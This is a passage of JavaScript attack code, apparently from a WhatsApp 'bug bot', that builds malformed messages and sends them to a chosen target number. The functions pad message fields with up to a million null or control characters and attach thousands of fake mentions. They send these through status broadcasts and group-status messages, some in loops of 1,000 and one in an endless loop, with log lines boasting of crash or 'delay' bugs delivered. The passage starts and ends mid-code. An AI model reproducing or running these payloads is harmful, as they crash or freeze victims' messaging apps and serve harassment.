      userJid: target,
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
   });

   await sock.relayMessage("status@broadcast", msg2, {
      messageId: null,
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: { jid: target },
               content: undefined
            }]
         }]
      }]
   });

   const msg3 = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
         body: {
            text: "Ovalium - Xxnx𓆩𓆪༒༻꧂" + "𑂺𑂹𑂻".repeat(6000)
         },
         nativeFlowResponseMessage: {
            name: "button_reply",
            paramsJson: JSON.stringify({ id: "option_a" })
         }
      }
   }, {
      timestamp: Date.now(),
      userJid: target,
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
   });

   await sock.relayMessage("status@broadcast", msg3, {
      messageId: null,
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: { jid: target },
               content: undefined
            }]
         }]
      }]
   });

   const msg4 = await generateWAMessageFromContent("status@broadcast", {
      botInvokeMessage: {
         message: {
            listResponseMessage: {
               title: " ? Lol ",
               description: " Mampus Delay Dek ",
               listType: 1,
               singleSelectReply: {
                  selectedRowId: "\"f*ck bastard\""
               },
               contextInfo: {
                  forwardingScore: 999,
                  isForwarded: true,
                  fromMe: false,
                  remoteJid: " dnd ",
                  participant: "ddd",
                  urlTrackingMap: Array.from({ length: 209000 }, (_, z) => ({
                     participant: `62${z + 720599}@s.whatsapp.net`,
                     type: 1
                  }))
               }
            }
         }
      }
   }, { 
      timestamp: Date.now(),
      userJid: target 
   });

   await sock.relayMessage("status@broadcast", msg4, {
      messageId: null,
      participant: { jid: target },
      statusJidList: [target],
      additionalNodes: [{
         tag: "meta",
         attrs: {},
         content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
               tag: "to",
               attrs: { jid: target },
               content: undefined
            }]
         }]
      }]
   });

   console.log("Succes Send Bug Delay Invisible");
}

async function XFolwes(target, status) {
    const MsgPayment = Array.from({ length: 1900 }, (_, r) => ({
        title: "᭄".repeat(9696),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }))

    const Msg = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "X",
                    listType: 2,
                    buttonText: null,
                    sections: MsgPayment,
                    singleSelectReply: { selectedRowId: "\u0000" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9696,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9696@newsletter",
                            serverMessageId: 1,
                            newsletterName: "----UnCann"
                        }
                    },
                    description: "᭄-CannGluncer"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    }

    const Msg2 = generateWAMessageFromContent(target, Msg, {})

    await sock.relayMessage("status@broadcast", Msg2.message, {
        messageId: Msg2.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    })

    if (status) {
        await sock.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: delayInstantStatus.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "\u0000" },
                        content: undefined
                    }
                ]
            }
        )
    }
    for (let i = 0; i < 1000; i++) {
        const push = [];
        const buttons = [];

        for (let j = 0; j < 1000; j++) {  
            buttons.push({  
                name: 'galaxy_message',  
                buttonParamsJson: JSON.stringify({  
                    header: 'null',  
                    body: 'xxx',  
                    flow_action: 'navigate',  
                    flow_action_payload: {  
                        screen: 'FORM_SCREEN'  
                    },  
                    flow_cta: 'Grattler',  
                    flow_id: '1169834181134583',  
                    flow_message_version: '3',  
                    flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',  
                }),  
            });  
        }  
          
        for (let k = 0; k < 1000; k++) {  
            push.push({  
                body: {  
                    text: '𖣂᳟᪳'  
                },  
                footer: {  
                    text: ''  
                },  
                header: {  
                    title: 'X ',  
                    hasMediaAttachment: true,  
                    imageMessage: {  
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',  
                        mimetype: 'image/jpeg',  
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',  
                        fileLength: '591',  
                        height: 0,  
                        width: 0,  
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',  
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',  
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',  
                        mediaKeyTimestamp: '1721344123',  
                        jpegThumbnail: '/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z',  
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',  
                        scanLengths: [247, 201, 73, 63],  
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=',  
                    },  
                },  
                nativeFlowMessage: {  
                    buttons: [],  
                },  
            });  
        }  
          
        const carousel = generateWAMessageFromContent(target, {  
            interactiveMessage: {  
                header: {  
                    hasMediaAttachment: false,  
                },  
                body: {  
                    text: '\u0000\u0000\u0000\u0000',  
                },  
                footer: {  
                    text: 'X⤻᪳',  
                },  
                carouselMessage: {  
                    cards: [...push],  
                },  
            }  
        }, {  
            userJid: target  
        });  
          
        await sock.relayMessage(target, { groupStatusMessageV2: { message: carousel.message } }, {  
            messageId: carousel.key.id,  
            participant: {  
                jid: target  
            },  
        });  
    }  
    await sock.relayMessage("status@broadcast", { 
        conversation: "X" 
    });

    await sock.relayMessage("status@broadcast", {  
        statusJidList: [target],  
        additionalNodes: [{  
            tag: "meta",  
            attrs: {  
                status_setting: "allowlist"  
            },  
            content: [{  
                tag: "mentioned_users",  
                attrs: {},  
                content: [{  
                    tag: "to",  
                    attrs: {  
                        jid: target  
                    }  
                }]  
            }]  
        }]  
    });
};

async function LittleFunnyMURBUG(target, mention = true, userId = null)
{
  try {
    const maxRepeatCount = 522500
    let currentRepeatCount = maxRepeatCount
    if(userId){
      const startCount = 522499
      const incrementCount = 1
      currentRepeatCount = getCurrentRepeat('littlefunnymurbug', userId, startCount)
      incrementRepeatCount('littlefunnymurbug', userId, currentRepeatCount, incrementCount, maxRepeatCount)
    }
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });
    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                  )
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }

  } catch (err) {
    console.error("⚠️ Error Spam For Murbug:", err.message);
  }
}

async function ghostsecret(sock, target) {
  const totalPerCycle = 5;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  let cycle = 1;

  console.log(`🚀 Delay BUG RUNNING | Target: ${target}\n`);

  while (true) {
    console.log(`🔁 Memulai Cycle ke-${cycle}\n`);

    for (let i = 0; i < totalPerCycle; i++) {
      try {
        const percent = Math.floor(((i + 1) / totalPerCycle) * 100);

        console.log(
          `🎯 Target  : ${target}\n` +
          `📦 Cycle   : ${cycle}\n` +
          `📨 Progress: ${percent}%\n` +
          `⚙️ Status  : Mengirim...\n`
        );

        if (!target) throw new Error("Target tidak valid");
                
         await await MsgAudioxxx(sock, target);
         await sleep(1500);
         
        await LittleFunnyMURBUG(target);
        await sleep(1500);

        console.log(`✅Ovalium Bug Berhasil terkirim (${percent}%)\n`);

      } catch (err) {
        console.log(`❌ Gagal kirim (${i + 1}) -> ${err.message}\n`);
        await sleep(3000);
      }
    }

    console.log(`✔️ Cycle ${cycle} selesai. Istirahat sebelum ulang...\n`);
    cycle++;
    await sleep(10000); // delay antar cycle
  }
}

async function CStatus(sock, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "\u0000".repeat(9000),
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                version: 3
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                isForwarded: true,
                forwardingScore: 7205,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363395010254840@newsletter",
                    newsletterName: "Ovalium",
                    serverMessageId: 1000,
                    accessibilityText: "idk"
                },
                statusAttributionType: "RESHARED_FROM_MENTION",
                contactVcard: true,
                isSampled: true,
                dissapearingMode: {
                    initiator: target,
                    initiatedByMe: true
                },
                expiration: Date.now()
            },
        }
    }, {});

    await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, {
        participant: { jid: target }
    });
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "X",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                    entryPointConversionSource: "call_permission_request"
                }
            }
        }
    };

    const msg2 = {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    };

    for (let i = 0; i < 1000; i++) {
        const payload = generateWAMessageFromContent(target, msg1, msg2);

        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: payload.message
            }
        }, { messageId: payload.key.id, participant: { jid: target } });

        await sleep(1000);
    }

    await sock.relayMessage("status@broadcast", {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });
}
async function CStatusxx(sock, target) {
  const messages = []

  messages.push({
    jid: "status@broadcast",
    message: {
      viewOnceMessage: {
        message: {
          requestPermissionMessage: {
            body: {
              text: "KILLER YOU",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "review_and_pay",
              paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"⌁⃰𝐗𝐌𝐋 𝐈𝐧𝐕𝐢𝐬𝐢𝐛𝐥𝐞\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"null\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
              version: 3
            }
          }
        }
      }
    },
    options: {
      messageId: `${Date.now()}`,
      statusJidList: [target, "13135550002@s.whatsapp.net"]
    }
  })

  messages.push({
    jid: "status@broadcast",
    message: {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: { 
              text: "\u0000".repeat(400000), 
              format: "DEFAULT" 
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    options: {
      statusJidList: [target]
    }
  })

  messages.push({
    jid: "status@broadcast",
    message: {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: { title: "Invisible Delay Send" },
            body: { 
              text: "Whatever" + "\u0000".repeat(1045000) 
            },
            nativeFlowMessage: {
              messageParamsJson: "Y",
              buttons: [
                { 
                  name: "cta_url", 
                  buttonParamsJson: "{}" 
                },
                { 
                  name: "call_permission_request", 
                  buttonParamsJson: "{}" 
                }
              ]
            }
          }
        }
      }
    },
    options: {
      statusJidList: [target]
    }
  })

  messages.push({
    jid: "status@broadcast",
    message: {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "What Do You Mean.",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "galaxy_message"
          }
        }
      }
    },
    options: {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ 
            tag: "to", 
            attrs: { jid: target } 
          }]
        }]
      }]
    }
  })

  const msg4 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(9000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Bekasi\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363395010254840@newsletter",
          newsletterName: "Xnxxx",
          serverMessageId: 1000,
          accessibilityText: "idk"
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      }
    }
  }, {})

  messages.push({
    jid: "status@broadcast",
    message: {
      groupStatusMessageV2: {
        message: msg4.message
      }
    },
    options: {
      statusJidList: [target]
    }
  })

  for (let i = 0; i < 1000; i++) {
    const msg5 = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3
            },
            entryPointConversionSource: "call_permission_request"
          }
        }
      }
    }

    const msg6 = {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
    }

    const payload = generateWAMessageFromContent(target, msg5, msg6)
    
    messages.push({
      jid: "status@broadcast",
      message: {
        groupStatusMessageV2: {
          message: payload.message
        }
      },
      options: {
        statusJidList: [target]
      }
    })
  }

  messages.push({
    jid: "status@broadcast",
    message: {},
    options: {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }
  })

  for (const msg of messages) {
    await sock.relayMessage(msg.jid, msg.message, msg.options)
  }

  console.log(`SUCCES SENDING BUG TO ${target}`)
}

async function suspendDelay(target, mention = true, userId = null) {
  try {
    const maxRepeatCount = 522500;
    let currentRepeatCount = maxRepeatCount;
    
    if(userId) {
      const startCount = 522499;
      const incrementCount = 1;
      currentRepeatCount = getCurrentRepeat('suspendDelay', userId, startCount);
      incrementRepeatCount('suspendDelay', userId, currentRepeatCount, incrementCount, maxRepeatCount);
    }
    
    const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }

  } catch (err) {
    console.error("⚠️ Error Spam For Delay:", err.message);
  }
  console.log(`SUCCES SEND DELAY HARD TO ${target}`);
}


async function hyperSleep(sock, target) {
    const delay = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    nativeFlowResponseMessage: {
                        stickerMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
                            fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
                            fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
                            mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
                            mimetype: "image/webp",
                            height: 9999,
                            width: 9999,
                            directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",
                            fileLength: 12260,
                            mediaKeyTimestamp: "1743832131",
                            isAnimated: false,
                            stickerSentTs: "X",
                            isAvatar: false,
                            isAiSticker: false,
                            degreesLatitude: 9999,
                            degreesLongitude: -9999,
                            address: "maklu",
                            isLottie: false,
                            contextInfo: {
                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1900 }, () =>
                                        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                                    ),
                                ],
                                stanzaId: "1234567890ABCDEF",
                                name: "cta_call",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "ꦽ".repeat(10000),
                                    thumbnailHeight: 480,
                                    thumbnailWidth: 339,
                                    caption: "ꦾ".repeat(15000),
                                    forwardedNewsletterMessageInfo: {
                                        newsletterJid: "0@newsletter",
                                        newsletterName: "ꦾ".repeat(23000),
                                    },
                                    contextInfo: {
                                        forwardingScore: 100,
                                        isForwarded: true,
                                        businessMessageForwardInfo: {
                                            businessOwnerJid: "13135550002@s.whatsapp.net",
                                        },
